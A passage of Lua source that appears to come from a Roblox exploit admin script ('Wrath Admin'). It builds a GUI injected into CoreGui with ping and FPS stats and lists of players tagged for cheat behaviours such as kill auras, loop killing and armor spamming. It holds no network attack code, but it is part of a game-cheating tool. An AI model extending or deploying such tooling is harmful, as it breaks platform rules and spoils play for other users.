    PlayerListRound_7 = Instance.new("UICorner");
    CommandsListFrame = Instance.new("ScrollingFrame");
    UIListLayout_7 = Instance.new("UIListLayout");
    Command = Instance.new("TextButton");
    UICorner_31 = Instance.new("UICorner");
    Output = Instance.new("Frame");
    TemplateTopbar_3 = Instance.new("Frame");
    TemplateTopbarRound_7 = Instance.new("UICorner");
    TemplateTitle_3 = Instance.new("TextLabel");
    PlayerListRound_8 = Instance.new("UICorner");
    OutputListFrame = Instance.new("ScrollingFrame");
    UIListLayout_8 = Instance.new("UIListLayout");
    Log = Instance.new("TextButton");
    UICorner_32 = Instance.new("UICorner");
};

--Properties:

MainGuiObjects.WrathAdminGuiMain.Name = "WrathAdminGuiMain"
MainGuiObjects.WrathAdminGuiMain.Parent = CoreGui
MainGuiObjects.WrathAdminGuiMain.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

MainGuiObjects.Stats.Name = "Stats"
MainGuiObjects.Stats.Parent = MainGuiObjects.WrathAdminGuiMain
MainGuiObjects.Stats.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.Stats.BorderSizePixel = 0
MainGuiObjects.Stats.Position = UDim2.new(0.280947268, 81, 0.657276988, -223)
MainGuiObjects.Stats.Size = UDim2.new(0, 242, 0, 164)
makeDraggable(MainGuiObjects.Stats);

MainGuiObjects.TemplateTopbar.Name = "TemplateTopbar"
MainGuiObjects.TemplateTopbar.Parent = MainGuiObjects.Stats
MainGuiObjects.TemplateTopbar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TemplateTopbar.BorderSizePixel = 0
MainGuiObjects.TemplateTopbar.Size = UDim2.new(0, 242, 0, 31)

MainGuiObjects.TemplateTopbarRound.CornerRadius = UDim.new(0, 5)
MainGuiObjects.TemplateTopbarRound.Name = "TemplateTopbarRound"
MainGuiObjects.TemplateTopbarRound.Parent = MainGuiObjects.TemplateTopbar

MainGuiObjects.TemplateTitle.Name = "TemplateTitle"
MainGuiObjects.TemplateTitle.Parent = MainGuiObjects.TemplateTopbar
MainGuiObjects.TemplateTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TemplateTitle.BackgroundTransparency = 1.000
MainGuiObjects.TemplateTitle.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TemplateTitle.Size = UDim2.new(0, 242, 0, 31)
MainGuiObjects.TemplateTitle.Font = Enum.Font.Code
MainGuiObjects.TemplateTitle.Text = "Stats"
MainGuiObjects.TemplateTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TemplateTitle.TextSize = 31.000

MainGuiObjects.PlayerListRound.CornerRadius = UDim.new(0, 5)
MainGuiObjects.PlayerListRound.Name = "PlayerListRound"
MainGuiObjects.PlayerListRound.Parent = MainGuiObjects.Stats

MainGuiObjects.StatesListFrame.Name = "StatesListFrame"
MainGuiObjects.StatesListFrame.Parent = MainGuiObjects.Stats
MainGuiObjects.StatesListFrame.Active = true
MainGuiObjects.StatesListFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.StatesListFrame.BorderSizePixel = 0
MainGuiObjects.StatesListFrame.Position = UDim2.new(0.02892562, 0, 0.248236686, 0)
MainGuiObjects.StatesListFrame.Size = UDim2.new(0, 225, 0, 114)
MainGuiObjects.StatesListFrame.ScrollBarThickness = 1

MainGuiObjects.UIListLayout.Parent = MainGuiObjects.StatesListFrame
MainGuiObjects.UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
MainGuiObjects.UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
MainGuiObjects.UIListLayout.Padding = UDim.new(0, 5)

MainGuiObjects.Stat.Name = "Stat"
MainGuiObjects.Stat.Parent = MainGuiObjects.StatesListFrame
MainGuiObjects.Stat.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Stat.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Stat.BorderSizePixel = 0
MainGuiObjects.Stat.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Stat.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Stat.Font = Enum.Font.Code
MainGuiObjects.Stat.Text = " Ping"
MainGuiObjects.Stat.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Stat.TextSize = 14.000
MainGuiObjects.Stat.TextXAlignment = Enum.TextXAlignment.Left

MainGuiObjects.UICorner.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner.Parent = MainGuiObjects.Stat

MainGuiObjects.TextLabel.Parent = MainGuiObjects.Stat
MainGuiObjects.TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel.Font = Enum.Font.Code
MainGuiObjects.TextLabel.Text = "100"
MainGuiObjects.TextLabel.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel.TextSize = 14.000
MainGuiObjects.TextLabel.TextXAlignment = Enum.TextXAlignment.Right

MainGuiObjects.Stat_2.Name = "Stat"
MainGuiObjects.Stat_2.Parent = MainGuiObjects.StatesListFrame
MainGuiObjects.Stat_2.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Stat_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Stat_2.BorderSizePixel = 0
MainGuiObjects.Stat_2.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Stat_2.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Stat_2.Font = Enum.Font.Code
MainGuiObjects.Stat_2.Text = " FPS"
MainGuiObjects.Stat_2.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Stat_2.TextSize = 14.000
MainGuiObjects.Stat_2.TextXAlignment = Enum.TextXAlignment.Left

MainGuiObjects.UICorner_2.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_2.Parent = MainGuiObjects.Stat_2

MainGuiObjects.TextLabel_2.Parent = MainGuiObjects.Stat_2
MainGuiObjects.TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_2.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_2.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_2.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_2.Font = Enum.Font.Code
MainGuiObjects.TextLabel_2.Text = ""
MainGuiObjects.TextLabel_2.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_2.TextSize = 14.000
MainGuiObjects.TextLabel_2.TextXAlignment = Enum.TextXAlignment.Right

------------ MEASURE PING + FPS --------------
task.spawn(function()
    while task.wait(0.03) do
        local Ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString() or "nil";
        local FPS = math.floor(1/rService.RenderStepped:wait());
        MainGuiObjects.TextLabel.Text = "  " .. Ping:split(" ")[1];
        MainGuiObjects.TextLabel_2.Text = "  " .. FPS;
    end;
end);

MainGuiObjects.Stat_3.Name = "Stat"
MainGuiObjects.Stat_3.Parent = MainGuiObjects.StatesListFrame
MainGuiObjects.Stat_3.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Stat_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Stat_3.BorderSizePixel = 0
MainGuiObjects.Stat_3.Position = UDim2.new(-0.00444444455, 0, 0.00902553741, 0)
MainGuiObjects.Stat_3.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Stat_3.Font = Enum.Font.Code
MainGuiObjects.Stat_3.Text = " Run Time"
MainGuiObjects.Stat_3.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Stat_3.TextSize = 14.000
MainGuiObjects.Stat_3.TextXAlignment = Enum.TextXAlignment.Left

MainGuiObjects.UICorner_3.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_3.Parent = MainGuiObjects.Stat_3

MainGuiObjects.TextLabel_3.Parent = MainGuiObjects.Stat_3
MainGuiObjects.TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_3.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_3.Position = UDim2.new(0.715555549, 0, 0, 0)
MainGuiObjects.TextLabel_3.Size = UDim2.new(0, 64, 0, 25)
MainGuiObjects.TextLabel_3.Font = Enum.Font.Code
MainGuiObjects.TextLabel_3.Text = "0:00:00"
MainGuiObjects.TextLabel_3.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_3.TextSize = 14.000
MainGuiObjects.TextLabel_3.TextXAlignment = Enum.TextXAlignment.Right

--------- RUN TIME --------
task.spawn(function()
    while task.wait(0.03) do
        MainGuiObjects.TextLabel_3.Text = tostring(math.floor(tick() - ExecutionTime));
    end;
end);

MainGuiObjects.GetPlayers.Name = "GetPlayers"
MainGuiObjects.GetPlayers.Parent = MainGuiObjects.WrathAdminGuiMain
MainGuiObjects.GetPlayers.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.GetPlayers.BorderSizePixel = 0
MainGuiObjects.GetPlayers.Position = UDim2.new(0.0118407542, 744, 0.017214397, 334)
MainGuiObjects.GetPlayers.Size = UDim2.new(0, 242, 0, 361)
makeDraggable(MainGuiObjects.GetPlayers);

MainGuiObjects.TemplateTopbar_2.Name = "TemplateTopbar"
MainGuiObjects.TemplateTopbar_2.Parent = MainGuiObjects.GetPlayers
MainGuiObjects.TemplateTopbar_2.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TemplateTopbar_2.BorderSizePixel = 0
MainGuiObjects.TemplateTopbar_2.Size = UDim2.new(0, 242, 0, 31)

MainGuiObjects.TemplateTopbarRound_2.CornerRadius = UDim.new(0, 5)
MainGuiObjects.TemplateTopbarRound_2.Name = "TemplateTopbarRound"
MainGuiObjects.TemplateTopbarRound_2.Parent = MainGuiObjects.TemplateTopbar_2

MainGuiObjects.TemplateTitle_2.Name = "TemplateTitle"
MainGuiObjects.TemplateTitle_2.Parent = MainGuiObjects.TemplateTopbar_2
MainGuiObjects.TemplateTitle_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TemplateTitle_2.BackgroundTransparency = 1.000
MainGuiObjects.TemplateTitle_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TemplateTitle_2.Size = UDim2.new(0, 242, 0, 31)
MainGuiObjects.TemplateTitle_2.Font = Enum.Font.Code
MainGuiObjects.TemplateTitle_2.Text = "Get Players"
MainGuiObjects.TemplateTitle_2.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TemplateTitle_2.TextSize = 31.000

MainGuiObjects.PlayerListRound_2.CornerRadius = UDim.new(0, 5)
MainGuiObjects.PlayerListRound_2.Name = "PlayerListRound"
MainGuiObjects.PlayerListRound_2.Parent = MainGuiObjects.GetPlayers

MainGuiObjects.GetPlayersContent.Name = "StatesListFrame"
MainGuiObjects.GetPlayersContent.Parent = MainGuiObjects.GetPlayers
MainGuiObjects.GetPlayersContent.Active = true
MainGuiObjects.GetPlayersContent.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.GetPlayersContent.BorderSizePixel = 0
MainGuiObjects.GetPlayersContent.Position = UDim2.new(0.0495867766, 0, 0.112239599, 0)
MainGuiObjects.GetPlayersContent.Size = UDim2.new(0, 218, 0, 286)
MainGuiObjects.GetPlayersContent.ScrollBarThickness = 1

MainGuiObjects.TextButton.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.TextButton.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TextButton.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TextButton.BorderSizePixel = 0
MainGuiObjects.TextButton.Position = UDim2.new(0.0495867766, 0, 0.132604286, 0)
MainGuiObjects.TextButton.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.TextButton.Font = Enum.Font.Code
MainGuiObjects.TextButton.Text = "Armor Spammers"
MainGuiObjects.TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextButton.TextSize = 14.000

MainGuiObjects.UICorner_4.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_4.Parent = MainGuiObjects.TextButton

MainGuiObjects.TextButton_2.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.TextButton_2.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TextButton_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TextButton_2.BorderSizePixel = 0
MainGuiObjects.TextButton_2.Position = UDim2.new(0.0495867766, 0, 0.207450449, 0)
MainGuiObjects.TextButton_2.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.TextButton_2.Font = Enum.Font.Code
MainGuiObjects.TextButton_2.Text = "Admins"
MainGuiObjects.TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextButton_2.TextSize = 14.000

MainGuiObjects.UICorner_5.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_5.Parent = MainGuiObjects.TextButton_2

MainGuiObjects.TextButton_3.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.TextButton_3.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TextButton_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TextButton_3.BorderSizePixel = 0
MainGuiObjects.TextButton_3.Position = UDim2.new(0.0495867766, 0, 0.287764877, 0)
MainGuiObjects.TextButton_3.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.TextButton_3.Font = Enum.Font.Code
MainGuiObjects.TextButton_3.Text = "Invisible"
MainGuiObjects.TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextButton_3.TextSize = 14.000

MainGuiObjects.UICorner_6.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_6.Parent = MainGuiObjects.TextButton_3

MainGuiObjects.TextButton_4.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.TextButton_4.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TextButton_4.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TextButton_4.BorderSizePixel = 0
MainGuiObjects.TextButton_4.Position = UDim2.new(0.0495867766, 0, 0.366712272, 0)
MainGuiObjects.TextButton_4.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.TextButton_4.Font = Enum.Font.Code
MainGuiObjects.TextButton_4.Text = "Kill Auras"
MainGuiObjects.TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextButton_4.TextSize = 14.000

MainGuiObjects.UICorner_7.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_7.Parent = MainGuiObjects.TextButton_4

MainGuiObjects.TextButton_5.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.TextButton_5.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TextButton_5.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TextButton_5.BorderSizePixel = 0
MainGuiObjects.TextButton_5.Position = UDim2.new(0.0495867766, 0, 0.450444341, 0)
MainGuiObjects.TextButton_5.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.TextButton_5.Font = Enum.Font.Code
MainGuiObjects.TextButton_5.Text = "Tase Auras"
MainGuiObjects.TextButton_5.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextButton_5.TextSize = 14.000

MainGuiObjects.UICorner_8.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_8.Parent = MainGuiObjects.TextButton_5

MainGuiObjects.TextButton_6.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.TextButton_6.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TextButton_6.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TextButton_6.BorderSizePixel = 0
MainGuiObjects.TextButton_6.Position = UDim2.new(0.0495867766, 0, 0.627477825, 0)
MainGuiObjects.TextButton_6.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.TextButton_6.Font = Enum.Font.Code
MainGuiObjects.TextButton_6.Text = "Loop Killing"
MainGuiObjects.TextButton_6.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextButton_6.TextSize = 14.000

MainGuiObjects.UICorner_9.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_9.Parent = MainGuiObjects.TextButton_6

MainGuiObjects.TextButton_7.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.TextButton_7.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TextButton_7.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TextButton_7.BorderSizePixel = 0
MainGuiObjects.TextButton_7.Position = UDim2.new(0.0495867766, 0, 0.739917994, 0)
MainGuiObjects.TextButton_7.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.TextButton_7.Font = Enum.Font.Code
MainGuiObjects.TextButton_7.Text = "Loop Tasing"
MainGuiObjects.TextButton_7.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextButton_7.TextSize = 14.000

MainGuiObjects.UICorner_10.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_10.Parent = MainGuiObjects.TextButton_7

MainGuiObjects.TextButton_8.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.TextButton_8.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TextButton_8.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TextButton_8.BorderSizePixel = 0
MainGuiObjects.TextButton_8.Position = UDim2.new(0.0495867766, 0, 0.835611761, 0)
MainGuiObjects.TextButton_8.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.TextButton_8.Font = Enum.Font.Code
MainGuiObjects.TextButton_8.Text = "Infected"
MainGuiObjects.TextButton_8.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextButton_8.TextSize = 14.000

MainGuiObjects.UICorner_11.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_11.Parent = MainGuiObjects.TextButton_8

MainGuiObjects.UIListLayout_2.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
MainGuiObjects.UIListLayout_2.Padding = UDim.new(0, 5)

MainGuiObjects.TextButton_9.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.TextButton_9.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TextButton_9.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TextButton_9.BorderSizePixel = 0
MainGuiObjects.TextButton_9.Position = UDim2.new(0.0495867766, 0, 0.835611761, 0)
MainGuiObjects.TextButton_9.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.TextButton_9.Font = Enum.Font.Code
MainGuiObjects.TextButton_9.Text = "Protected"
MainGuiObjects.TextButton_9.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextButton_9.TextSize = 14.000

--last minute psuedo code :(
MainGuiObjects.GetFlingers = Instance.new("TextButton")
MainGuiObjects.GetFlingers.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.GetFlingers.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.GetFlingers.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.GetFlingers.BorderSizePixel = 0
MainGuiObjects.GetFlingers.Position = UDim2.new(0.0495867766, 0, 0.835611761, 0)
MainGuiObjects.GetFlingers.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.GetFlingers.Font = Enum.Font.Code
MainGuiObjects.GetFlingers.Text = "Invisible Flingers"
MainGuiObjects.GetFlingers.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.GetFlingers.TextSize = 14.000

MainGuiObjects.GFRound = Instance.new("UICorner");
MainGuiObjects.GFRound.CornerRadius = UDim.new(0, 5);
MainGuiObjects.GFRound.Parent = MainGuiObjects.GetFlingers;

MainGuiObjects.GetAntiShoots = Instance.new("TextButton")
MainGuiObjects.GetAntiShoots.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.GetAntiShoots.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.GetAntiShoots.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.GetAntiShoots.BorderSizePixel = 0
MainGuiObjects.GetAntiShoots.Position = UDim2.new(0.0495867766, 0, 0.835611761, 0)
MainGuiObjects.GetAntiShoots.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.GetAntiShoots.Font = Enum.Font.Code
MainGuiObjects.GetAntiShoots.Text = "Shoot Back"
MainGuiObjects.GetAntiShoots.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.GetAntiShoots.TextSize = 14.000

MainGuiObjects.GSRound = Instance.new("UICorner");
MainGuiObjects.GSRound.CornerRadius = UDim.new(0, 5);
MainGuiObjects.GSRound.Parent = MainGuiObjects.GetAntiShoots;

MainGuiObjects.GetTaseBack = Instance.new("TextButton")
MainGuiObjects.GetTaseBack.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.GetTaseBack.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.GetTaseBack.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.GetTaseBack.BorderSizePixel = 0
MainGuiObjects.GetTaseBack.Position = UDim2.new(0.0495867766, 0, 0.835611761, 0)
MainGuiObjects.GetTaseBack.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.GetTaseBack.Font = Enum.Font.Code
MainGuiObjects.GetTaseBack.Text = "Tase Back"
MainGuiObjects.GetTaseBack.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.GetTaseBack.TextSize = 14.000

MainGuiObjects.TBRound = Instance.new("UICorner");
MainGuiObjects.TBRound.CornerRadius = UDim.new(0, 5);
MainGuiObjects.TBRound.Parent = MainGuiObjects.GetTaseBack;

MainGuiObjects.GetClickTeleports = Instance.new("TextButton")
MainGuiObjects.GetClickTeleports.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.GetClickTeleports.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.GetClickTeleports.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.GetClickTeleports.BorderSizePixel = 0
MainGuiObjects.GetClickTeleports.Position = UDim2.new(0.0495867766, 0, 0.835611761, 0)
MainGuiObjects.GetClickTeleports.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.GetClickTeleports.Font = Enum.Font.Code
MainGuiObjects.GetClickTeleports.Text = "Click Teleport"
MainGuiObjects.GetClickTeleports.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.GetClickTeleports.TextSize = 14.000

MainGuiObjects.GCTPRound = Instance.new("UICorner");
MainGuiObjects.GCTPRound.CornerRadius = UDim.new(0, 5);
MainGuiObjects.GCTPRound.Parent = MainGuiObjects.GetClickTeleports;

MainGuiObjects.GetOnePunchers = Instance.new("TextButton")
MainGuiObjects.GetOnePunchers.Parent = MainGuiObjects.GetPlayersContent
MainGuiObjects.GetOnePunchers.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.GetOnePunchers.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.GetOnePunchers.BorderSizePixel = 0
MainGuiObjects.GetOnePunchers.Position = UDim2.new(0.0495867766, 0, 0.835611761, 0)
MainGuiObjects.GetOnePunchers.Size = UDim2.new(0, 218, 0, 26)
MainGuiObjects.GetOnePunchers.Font = Enum.Font.Code
MainGuiObjects.GetOnePunchers.Text = "One Punch"
MainGuiObjects.GetOnePunchers.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.GetOnePunchers.TextSize = 14.000

MainGuiObjects.GOPRound = Instance.new("UICorner");
MainGuiObjects.GOPRound.CornerRadius = UDim.new(0, 5);
MainGuiObjects.GOPRound.Parent = MainGuiObjects.GetOnePunchers;

MainGuiObjects.UICorner_12.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_12.Parent = MainGuiObjects.TextButton_9

MainGuiObjects.PlayerList.Name = "PlayerList"
MainGuiObjects.PlayerList.Parent = MainGuiObjects.GetPlayers
MainGuiObjects.PlayerList.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.PlayerList.BorderSizePixel = 0
MainGuiObjects.PlayerList.ClipsDescendants = true
MainGuiObjects.PlayerList.Position = UDim2.new(1.03321803, 0, -0.00102038682, 0)
MainGuiObjects.PlayerList.Size = UDim2.new(0, 186, 0, 195)
MainGuiObjects.PlayerList.Visible = false;

MainGuiObjects.ListTopbar.Name = "ListTopbar"
MainGuiObjects.ListTopbar.Parent = MainGuiObjects.PlayerList
MainGuiObjects.ListTopbar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.ListTopbar.BorderSizePixel = 0
MainGuiObjects.ListTopbar.Size = UDim2.new(0, 186, 0, 31)

MainGuiObjects.ListTopbarRound.CornerRadius = UDim.new(0, 5)
MainGuiObjects.ListTopbarRound.Name = "ListTopbarRound"
MainGuiObjects.ListTopbarRound.Parent = MainGuiObjects.ListTopbar

MainGuiObjects.ListTitle.Name = "ListTitle"
MainGuiObjects.ListTitle.Parent = MainGuiObjects.ListTopbar
MainGuiObjects.ListTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.ListTitle.BackgroundTransparency = 1.000
MainGuiObjects.ListTitle.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.ListTitle.Size = UDim2.new(0, 186, 0, 31)
MainGuiObjects.ListTitle.Font = Enum.Font.Code
MainGuiObjects.ListTitle.Text = ""
MainGuiObjects.ListTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.ListTitle.TextSize = 23.000

MainGuiObjects.PlayerListFrame.Name = "PlayerListFrame"
MainGuiObjects.PlayerListFrame.Parent = MainGuiObjects.ListTopbar
MainGuiObjects.PlayerListFrame.Active = true
MainGuiObjects.PlayerListFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.PlayerListFrame.BorderSizePixel = 0
MainGuiObjects.PlayerListFrame.Position = UDim2.new(0.049586799, 0, 1.20932424, 0)
MainGuiObjects.PlayerListFrame.Size = UDim2.new(0, 167, 0, 145)
MainGuiObjects.PlayerListFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
MainGuiObjects.PlayerListFrame.ScrollBarThickness = 1

function ToggleGuis()
    for i,v in pairs(MainGuiObjects.WrathAdminGuiMain:GetChildren()) do
        if v.Name ~= "Commands" and v.Name ~= "Output" then
            v.Visible = not v.Visible;
        end;
    end;
end;

function ToggleCmds()
    MainGuiObjects.Commands.Visible = not MainGuiObjects.Commands.Visible;
end;

function ToggleOutput()
    MainGuiObjects.Output.Visible = not MainGuiObjects.Output.Visible;
end;

local function ShowPlayers(Name, Table)
    for i,v in pairs(MainGuiObjects.PlayerListFrame:GetChildren()) do
        if v:IsA("TextButton") then
            v:Destroy();
        end;
    end;
    if MainGuiObjects.ListTitle.Text == Name then
        MainGuiObjects.PlayerList.Visible = not MainGuiObjects.PlayerList.Visible;
    else
        MainGuiObjects.ListTitle.Text = Name;
        MainGuiObjects.PlayerList.Visible = true;
    end;
    for i,v in next, Table do
        if Players:FindFirstChild(v.Name) then
            local TextButton_10 = Instance.new("TextButton")
            TextButton_10.Parent = MainGuiObjects.PlayerListFrame
            TextButton_10.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
            TextButton_10.BorderColor3 = Color3.fromRGB(27, 42, 53)
            TextButton_10.BorderSizePixel = 0
            TextButton_10.Position = UDim2.new(0, 0, 1.10570937e-07, 0)
            TextButton_10.Size = UDim2.new(0, 167, 0, 25)
            TextButton_10.Font = Enum.Font.Code
            TextButton_10.TextScaled = true;
            if v.DisplayName ~= v.Name then
                TextButton_10.Text = v.Name .. " (" .. v.DisplayName .. ")";
            else
                TextButton_10.Text = v.Name
            end;
            TextButton_10.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextButton_10.TextSize = 14.000
            TextButton_10.MouseButton1Click:Connect(function()
                if CurrentlyViewing and CurrentlyViewing.Player then
                    if CurrentlyViewing.Player.Name == v.Name then
                        UseCommand(Settings.Prefix .. "unview");
                    else
                        UseCommand(Settings.Prefix .. "view " .. v.Name);
                    end;
                else
                    UseCommand(Settings.Prefix .. "view " .. v.Name);
                end;
            end);
            local Corner = Instance.new("UICorner");
            Corner.CornerRadius = UDim.new(0, 5);
            Corner.Parent = TextButton_10;
            MainGuiObjects.PlayerListFrame.CanvasSize = UDim2.new(0, 0, 0, MainGuiObjects.UIListLayout_3.AbsoluteContentSize.Y)
            task.wait(0.03)
        end;
    end;
end;

MainGuiObjects.TextButton.MouseButton1Click:Connect(function()
    local Spammers = {};
    for i,v in pairs(ArmorSpamFlags) do
        if v > 50 then
            local Player = Players:FindFirstChild(i)
            if Player then
                Spammers[#Spammers+1] = Player;
            end;
        end;
    end;
    ShowPlayers("Armor Spammers", Spammers);
end);

